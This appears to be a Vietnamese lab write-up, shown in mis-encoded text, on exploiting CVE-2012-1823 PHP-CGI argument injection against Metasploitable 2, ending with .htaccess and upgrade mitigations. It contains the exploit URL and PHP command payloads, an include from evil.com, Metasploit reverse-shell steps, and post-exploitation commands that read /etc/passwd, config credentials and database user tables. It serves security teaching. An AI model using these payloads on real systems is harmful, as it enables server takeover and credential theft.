# ğŸ›¡ï¸ Remote Code Execution thÃ´ng qua PHP-CGI Argument Injection

âš ï¸ LÆ°u Ã½: CÃ¡c bÆ°á»›c khai thÃ¡c chá»‰ nÃªn thá»­ nghiá»‡m trÃªn mÃ´i trÆ°á»ng lab, tuyá»‡t Ä‘á»‘i khÃ´ng sá»­ dá»¥ng trÃªn há»‡ thá»‘ng sáº£n xuáº¥t!
> - **TÃªn lá»— há»ng:** PHP CGI Argument Injection
> - **MÃ£ CVE:** CVE-2012-1823
> - **Má»©c Ä‘á»™:** Cao
> - **NgÃ y phÃ¡t hiá»‡n:** thÃ¡ng 5 nÄƒm 2012

## ğŸ§± 1. MÃ´ táº£ lá»— há»•ng
- **"Lá»–I NÃ€Y Xáº¢Y RA VÃŒ:"**
> - "PHP phiÃªn báº£n cÅ© (â‰¤ 5.3.12 hoáº·c 5.4.2)"
> -  "VÃ  PHP dÆ°á»›i cháº¿ Ä‘á»™ CGI (Common Gateway Interface)"
> -  "PHP phÃ¢n tÃ­ch sai tham sá»‘ truyá»n tá»« URL, cho phÃ©p attacker chÃ¨n lá»‡nh nguy hiá»ƒm"
â˜‘ï¸ Káº» táº¥n cÃ´ng thá»±c thi lá»‡nh tÃ¹y Ã½ tá»« xa (RCE â€“ Remote Code Execution) thÃ´ng qua Ä‘á»‘i sá»‘ dÃ²ng lá»‡nh (argument injection).

## Hacker Ä‘Ã£ lá»£i dá»¥ng gÃ¬?
- Hacker lá»£i dá»¥ng PHP-CGI hiá»ƒu nháº§m query string (?-d ...) lÃ  Ä‘á»‘i sá»‘ dÃ²ng lá»‡nh, tá»« Ä‘Ã³ Ã©p PHP náº¡p vÃ  thá»±c thi mÃ£ do hacker gá»­i.

## Ká»¹ thuáº­t khai thÃ¡c:
- Gá»­i má»™t HTTP request cÃ³ ? chá»©a argument báº¥t há»£p lá»‡ vÃ o php-cgi
- Truyá»n mÃ£ PHP Ä‘á»™c háº¡i thÃ´ng qua POST
- Káº¿t quáº£: shell Ä‘Æ°á»£c thá»±c thi tá»« xa

### Gá»­i má»™t HTTP request cÃ³ ? chá»©a argument báº¥t há»£p lá»‡ vÃ o php-cgi

- Náº¿u mÃ¡y chá»§ sá»­ dá»¥ng php-cgi mÃ  khÃ´ng báº­t tÃ¹y chá»n an toÃ n (--no-header, --force-cgi-redirect) hoáº·c khÃ´ng cáº¥u hÃ¬nh Ä‘Ãºng, thÃ¬ attacker cÃ³ thá»ƒ:

- â¡ ThÃªm tÃ¹y chá»n dÃ²ng lá»‡nh cho PHP ngay trong URL nhÆ°:
```
http://victim.com/index.php?-d+allow_url_include=on+-d+auto_prepend_file=php://input
```
- á» Ä‘Ã¢y, -d lÃ  tham sá»‘ PHP Ä‘á»ƒ chá»‰nh cáº¥u hÃ¬nh táº¡i runtime.
- âœ… VÃ¬ trÃ¬nh thÃ´ng dá»‹ch php-cgi khÃ´ng phÃ¢n biá»‡t tham sá»‘ tháº­t vÃ  giáº£ â€” nÃ³ tÆ°á»Ÿng -d lÃ  cáº¥u hÃ¬nh bÃ¬nh thÆ°á»ng do admin Ä‘Æ°a vÃ o.

```
-d allow_url_include=on  
-d auto_prepend_file=php://input
```

#### ğŸ§  1. -d allow_url_include=on

- ğŸ“Œ NghÄ©a lÃ :
> Cho phÃ©p PHP include file qua URL, vÃ­ dá»¥ nhÆ°:

```
include("http://evil.com/shell.txt");
```

âš ï¸ Máº·c Ä‘á»‹nh, allow_url_include bá»‹ táº¯t (off) vÃ¬ cá»±c ká»³ nguy hiá»ƒm â€“ káº» táº¥n cÃ´ng cÃ³ thá»ƒ táº£i mÃ£ Ä‘á»™c tá»« internet vÃ o mÃ¡y chá»§.

#### ğŸ§  2. -d auto_prepend_file=php://input

- ğŸ“Œ NghÄ©a lÃ :

> TrÆ°á»›c khi thá»±c thi script chÃ­nh (index.php), PHP sáº½ cháº¡y ná»™i dung tá»« php://input.

#### ğŸ§¾ Giáº£i thÃ­ch php://input
- php://input lÃ  má»™t stream trong PHP cho phÃ©p truy cáº­p raw data tá»« body cá»§a HTTP request (thÆ°á»ng dÃ¹ng trong POST).

- Hacker sáº½ gá»­i mÃ£ PHP Ä‘á»™c trong pháº§n body, vÃ­ dá»¥:

```
POST /index.php?... HTTP/1.1
Host: victim.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 37

<?php system($_GET['cmd']); ?>
```







## âš’ï¸ 2. Thá»­ nghiá»‡m thá»±c táº¿
- **Topology**

<img width="634" height="210" alt="image" src="https://github.com/user-attachments/assets/99335dfc-2aa0-4397-b75e-72c27fb406c1" />

- QUYÃ‰T MÃY CHá»¦ Ä‘á»ƒ tÃ¬m thÃ´ng tin vá» phiÃªn báº£n web server:

<img width="704" height="259" alt="image" src="https://github.com/user-attachments/assets/d9664fec-59cf-4cb9-8c63-3083583190b1" />

### Sau khi xÃ¡c minh Ä‘Æ°á»£c phiÃªn báº£n PHP trÃªn web server lÃ  5.4.2. TÃ¬m kiáº¿m cÃ¡c lá»— há»•ng báº£o máº­t cÃ³ liÃªn quan:
```
sudo msfconsole
```

```
search php_cgi
```

### Sá»­ dá»¥ng module php_cgi_arg_injection cá»§a Metataploit Ä‘á»ƒ chiáº¿m shell trÃªn Metasploitable
```
use multi/http/php_cgi_arg_injection
```

### XEM SETTING
```
show options
```

```
set rhost <IP Metasploitable 2>
```

```
# set lhost
# set lport
```

```
set PAYLOAD php/meterpreter/reverse_tcp
```

```
exploit
```

```
shell
```

### âš”ï¸ 1. Kiá»ƒm tra thÃ´ng tin há»‡ thá»‘ng
```
uname -a          # ThÃ´ng tin kernel
id                # Kiá»ƒm tra UID, GID
```

### ğŸ” 2. Kiá»ƒm tra cÃ¡c user trÃªn há»‡ thá»‘ng
```
cat /etc/passwd
```
- LÃ  danh sÃ¡ch toÃ n bá»™ ngÆ°á»i dÃ¹ng cÃ³ trÃªn há»‡ thá»‘ng Linux

### ğŸ“ 4. KhÃ¡m phÃ¡ thÆ° má»¥c home, cÃ³ thá»ƒ chá»©a thÃ´ng tin nháº¡y cáº£m [*]
```
cd /home
ls -la
```

#### ğŸ” Xem ná»™i dung cÃ¡c thÆ° má»¥c /home
```
ls -la /home/msfadmin
ls -la /home/user
ls -la /home/service
```

- âœ… Hiá»ƒn thá»‹ chi tiáº¿t táº¥t cáº£ thÆ° má»¥c ngÆ°á»i dÃ¹ng trong /home

### ğŸ”‘ 5. TÃ¬m kiáº¿m thÃ´ng tin nháº¡y cáº£m: máº­t kháº©u, private key, cáº¥u hÃ¬nh database
```
find /var/www -type f -iname "*config*.php"
```

#### ğŸ” Äáº·c biá»‡t chÃº Ã½ cÃ¡c file trong dvwa, mutillidae, phpMyAdmin, tikiwiki: [*]
```
cat /var/www/dvwa/config/config.inc.php
```

<img width="950" height="441" alt="image" src="https://github.com/user-attachments/assets/c4b0795d-7993-4b1a-9906-8b4096b8592f" />

### ğŸ”„ 7. Náº¿u cÃ³ thÃ´ng tin Ä‘Äƒng nháº­p MySQL, thá»­ Ä‘Äƒng nháº­p: [*]
```
mysql -u root -p
```

```
show databases;
```

```
exit
```

```
USE dvwa;
SHOW TABLES;
SELECT * FROM users;
```

```
exit
```


### ğŸ§± 8. Kiá»ƒm tra cÃ¡c tiáº¿n trÃ¬nh Ä‘ang cháº¡y, dá»‹ch vá»¥ kháº£ nghi
```
ps aux
```


#### THá»°C HIá»†N CHÃM SHELL
```
python -c 'import pty; pty.spawn("/bin/bash")'
```

```
su users
```

hoáº·c
```
su msfadmin
# máº­t kháº©u: msfadmin hoáº·c password
```

## ğŸ“‰ 3. Rá»§i ro an ninh

| Káº¿t quáº£                                               | Diá»…n giáº£i                                                              |
| ----------------------------------------------------- | ---------------------------------------------------------------------- |
| ğŸ§  Thá»±c thi lá»‡nh tá»« xa (RCE)                          | Hacker cháº¡y Ä‘Æ°á»£c lá»‡nh há»‡ thá»‘ng nhÆ° `id`, `uname`, `cat /etc/passwd`    |
| ğŸš Nháº­n Ä‘Æ°á»£c **web shell**                            | Hacker chÃ¨n reverse shell, má»Ÿ káº¿t ná»‘i tá»« mÃ¡y náº¡n nhÃ¢n vá»               |
| ğŸ“¥ Táº£i malware, cÃ i backdoor                          | Hacker chiáº¿m quyá»n mÃ¡y chá»§, bÃ­ máº­t táº£i mÃ£ Ä‘á»™c vá»                       |
| ğŸ•µï¸ Truy cáº­p database, file, cÃ¡c há»‡ thá»‘ng ná»™i bá»™ khÃ¡c | Do `www-data` thÆ°á»ng cÃ³ quyá»n Ä‘á»c mÃ£ nguá»“n web, file cáº¥u hÃ¬nh database |

## ğŸ›¡ï¸ 4. Äá» xuáº¥t kháº¯c phá»¥c

| HÃ nh Ä‘á»™ng               | Chi tiáº¿t                                                      |
| ----------------------- | ------------------------------------------------------------- |
| ğŸ”„ **Cáº­p nháº­t PHP**     | NÃ¢ng cáº¥p PHP lÃªn Ã­t nháº¥t phiÃªn báº£n **7.4 trá»Ÿ lÃªn**            |
| ğŸ” **Táº¯t PHP-CGI**      | Náº¿u khÃ´ng báº¯t buá»™c dÃ¹ng CGI, táº¯t hoÃ n toÃ n module             |
| ğŸš§ **Cáº¥u hÃ¬nh WAF/IDS** | Triá»ƒn khai WAF (ModSecurity, v.v...) Ä‘á»ƒ lá»c tham sá»‘ nguy hiá»ƒm |
| ğŸ§¹ **Quáº£n lÃ½ báº£n vÃ¡**   | Thiáº¿t láº­p lá»‹ch cáº­p nháº­t pháº§n má»m Ä‘á»‹nh ká»³                      |

### Lá»c Tham Sá»‘ Nguy Hiá»ƒm

> - `-d`, `-n`, `-s`...

```
cd /var/www
sudo nano .htaccess
```

- DÃ¡n ná»™i dung sau:

```
<IfModule mod_rewrite.c>
  RewriteEngine On
  RewriteCond %{QUERY_STRING} ^(%2d|-)[^=]+$ [NC]
  RewriteRule ^.* - [F,L]
</IfModule>
```

- ğŸ” Kiá»ƒm tra nhanh

```
cat /etc/apache2/mods-enabled/
```

```
ls /etc/apache2/mods-enabled/rewrite.load
```

- reload

```
sudo a2enmod rewrite
sudo /etc/init.d/apache2 force-reload
```

- ğŸ›  Cho phÃ©p Apache sá»­ dá»¥ng .htaccess

```
sudo nano /etc/apache2/sites-available/default
```

- TÃ¬m 

```
<Directory /var/www/>
    Options Indexes FollowSymLinks MultiViews
    AllowOverride None
    Order allow,deny
    allow from all
</Directory>
```

- â¡ Sá»­a dÃ²ng AllowOverride None thÃ nh:

```
AllowOverride All
```

- ğŸ” Khá»Ÿi Ä‘á»™ng láº¡i Apache

```
sudo /etc/init.d/apache2 restart
```
### Cáº­p nháº­t PHP
- Æ¯u tiÃªn kháº¯c phá»¥c

## Tham Kháº£o

- https://github.com/0xl0k1/CVE-2012-1823
- [CVE-2012-1823 - NVD](https://nvd.nist.gov/vuln/detail/CVE-2012-1823)

## âœ… Káº¿t Luáº­n
## NOTEs

- **metaploit2**

| TrÆ°á»ng       | GiÃ¡ trá»‹    |
| ------------ | ---------- |
| **Username** | `msfadmin` |
| **Password** | `msfadmin` |

```
sudo ifconfig eth0 192.168.80.10 netmask 255.255.255.0 up 
```

- SSH Ä‘áº¿n metaploit2

```
export TERM=xterm
ssh -oHostKeyAlgorithms=+ssh-rsa -oPubkeyAcceptedAlgorithms=+ssh-rsa msfadmin@192.168.80.10
```
### So SÃ¡nh 

| TiÃªu chÃ­                   | mod\_php       | php-cgi                              | php-fpm (FastCGI)        |
| -------------------------- | -------------- | ------------------------------------ | ------------------------ |
| TÃ­ch há»£p vá»›i web server    | Gáº¯n vÃ o Apache | Cháº¡y bÃªn ngoÃ i                       | Cháº¡y ná»n, káº¿t ná»‘i socket |
| Hiá»‡u suáº¥t                  | Trung bÃ¬nhâ€“cao | **Tháº¥p** (vÃ¬ táº¡o tiáº¿n trÃ¬nh má»—i láº§n) | **Cao**                  |
| Quáº£n lÃ½ tiáº¿n trÃ¬nh         | Apache lo      | Tá»± táº¡o má»—i láº§n                       | CÃ³ sáºµn pool tiáº¿n trÃ¬nh   |
| Äa phiÃªn báº£n PHP           | KhÃ³            | CÃ³ thá»ƒ                               | âœ… Dá»…                     |
| Dá»… cáº¥u hÃ¬nh                | âœ… Ráº¥t dá»…       | Trung bÃ¬nh                           | KhÃ³ hÆ¡n chÃºt             |
| Dá»… bá»‹ lá»—i náº¿u sai cáº¥u hÃ¬nh | Tháº¥p           | **Cao** (vÃ­ dá»¥ CVE-2012-1823)        | Tháº¥p                     |
| Phá»• biáº¿n hiá»‡n nay          | Ãt dáº§n         | **Gáº§n nhÆ° lá»—i thá»i**                 | âœ… **Phá»• biáº¿n nháº¥t**      |


## ğŸ§­ SÆ¡ Ä‘á»“ luá»“ng khai thÃ¡c CVE-2012-1823
```
[ Hacker ]
   |
   | 1. Gá»­i HTTP request Ä‘áº·c biá»‡t:
   |    GET /index.php?-d+allow_url_include=1+-d+auto_prepend_file=php://input
   |    POST body: <?php system('id'); ?>
   |
   v
[ Web Server (Apache hoáº·c Nginx)]
   |
   | 2. Web server chuyá»ƒn yÃªu cáº§u tá»›i PHP-CGI (vÃ­ dá»¥: /usr/bin/php-cgi)
   |    LÆ°u Ã½: cÃ¡c tham sá»‘ `-d` bá»‹ chuyá»ƒn nguyÃªn váº¹n
   |
   v
[ PHP-CGI ]
   |
   | 3. Nháº­n tham sá»‘ cáº¥u hÃ¬nh Ä‘á»™ng:
   |    - Cho phÃ©p `allow_url_include = On`
   |    - ChÃ¨n mÃ£ tá»« `php://input` nhá» `auto_prepend_file`
   |
   v
[ PHP Engine ]
   |
   | 4. Äá»c ná»™i dung tá»« POST body:
   |    <?php system('id'); ?>
   |
   | â†’ Thá»±c thi mÃ£ PHP do hacker gá»­i
   |
   v
[ Káº¿t quáº£ ]
   â†’ Hacker thá»±c thi lá»‡nh tÃ¹y Ã½ trÃªn mÃ¡y chá»§
   â†’ Chiáº¿m quyá»n truy cáº­p, Ä‘á»c file, chiáº¿m shell...

```
```
â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”       â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”       â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”
â”‚  Hacker    â”‚â”€â”€â”€â”€â”€â”€â–¶ Web Server (Apache)â”‚â”€â”€â”€â”€â”€â”€â–¶â”‚ PHP-CGI Bá»‹   â”‚
â”‚            â”‚ HTTP  â”‚ cháº¡y PHP dÆ°á»›i CGI â”‚       â”‚ Lá»–I PHÃ‚N TÃCHâ”‚
â”‚ Gá»­i yÃªu cáº§uâ”‚â”€â”€â”€â”€â”€â”€â–¶ (index.php? -d ...)â”‚â”€â”€â”€â”€â”€â”€â–¶â”‚ QUERY STRING â”‚
â””â”€â”€â”€â”€â”¬â”€â”€â”€â”€â”€â”€â”€â”˜       â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜       â””â”€â”€â”€â”€â”¬â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜
     â”‚                                                 â”‚
     â”‚   POST body:                                    â”‚
     â”‚   <?php system("id"); ?>                        â”‚
     â”‚                                                 â–¼
     â”‚                                    â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”
     â”‚                                    â”‚ PHP hiá»ƒu:                 â”‚
     â”‚                                    â”‚ -d auto_prepend_file=... â”‚
     â”‚                                    â”‚ â†’ Äá»c mÃ£ tá»« php://input  â”‚
     â”‚                                    â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¬â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜
     â”‚                                               â”‚
     â–¼                                               â–¼
â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”                 â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”
â”‚  PHP thá»±c thi mÃ£     â”‚â—€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”‚    Äoáº¡n mÃ£ Ä‘á»™c gá»­i bá»Ÿi     â”‚
â”‚  system("id");       â”‚                 â”‚    hacker Ä‘Æ°á»£c thá»±c thi    â”‚
â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜                 â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜
             â”‚
             â–¼
â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”
â”‚  Hacker nháº­n káº¿t quáº£ tráº£ vá»â”‚
â”‚  (vÃ­ dá»¥: www-data, id, ...)â”‚
â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜
```
